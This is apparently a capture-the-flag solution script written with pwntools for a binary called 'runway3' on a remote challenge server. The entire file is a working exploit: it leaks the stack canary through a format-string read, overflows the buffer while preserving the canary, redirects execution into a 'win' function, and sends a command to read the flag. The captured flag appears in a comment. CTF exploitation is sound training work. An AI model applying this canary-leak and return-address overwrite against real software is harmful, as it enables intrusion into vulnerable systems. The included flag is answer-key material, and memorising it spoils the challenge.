#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway3", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challs.pwnoh.io", 13403)

p.sendlineafter(b"?\n", b"%13$p")
canary = int(p.readline().decode(), 16)

payload = b"A" * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(elf.sym["win"] + 0x17)

p.sendline(payload)

p.recv(0x28)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}
